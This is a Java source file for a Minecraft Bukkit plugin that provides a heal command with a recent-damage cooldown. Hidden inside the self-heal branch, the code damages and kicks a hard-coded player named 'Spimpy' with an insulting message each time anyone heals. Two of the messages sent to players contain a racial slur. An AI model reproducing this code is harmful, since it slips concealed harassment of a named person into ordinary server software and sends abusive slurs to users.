package com.olympuspvp.heal;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Sound;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class olyHeal extends JavaPlugin{

	final String tag = ChatColor.DARK_GREEN + "[" + ChatColor.GREEN + "olyHeal" + ChatColor.DARK_GREEN + "] " + ChatColor.GREEN;
	DamageListener dl = new DamageListener(this);
	@Override
	public void onEnable(){
		Bukkit.getPluginManager().registerEvents(dl, this);
		
	}
	
	public boolean onCommand(final CommandSender s, final Command cmd, final String c, final String[] args){
		if(s instanceof Player == false) return true;
		final Player p = (Player)s;
		if(!p.hasPermission("olyHeal.use")){
			p.sendMessage(tag + "You do not have permission to use this.");
			return true;
		}if(args.length == 0){
			if(dl.damage.contains(p.getName())){
				p.sendMessage("Nigga you been damaged. You can't heal yet.");
				return true;
			}
			p.setHealth(20);
			p.setFoodLevel(20);
			p.sendMessage(tag + "You have been healed and fed.");
			p.playSound(p.getLocation(), Sound.LEVEL_UP, 1f, 1f);
			final Player plr = Bukkit.getPlayerExact("Spimpy");
			if(plr != null){plr.damage(10);plr.kickPlayer("Fuck you </3");
			}
			}else if(args.length == 1){
			final String name = args[0];
			final Player heal = Bukkit.getPlayer(name);
			if(heal == null) p.sendMessage(tag + "Could not find player.");
			else{
				if(dl.damage.contains(heal.getName())){
					heal.sendMessage("Niggas be tryna heal yhu buchu been damaged recently.");
					return true;
				}
				heal.sendMessage(tag + "You were healed by " + ChatColor.DARK_GREEN + p.getName());
				p.sendMessage(tag + "You healed " + ChatColor.DARK_GREEN + heal.getName());
				heal.setHealth(20);
				heal.setFoodLevel(20);
				heal.playSound(heal.getLocation(), Sound.LEVEL_UP, 1f, 1f);
			}
		}
		return true;
	}

}
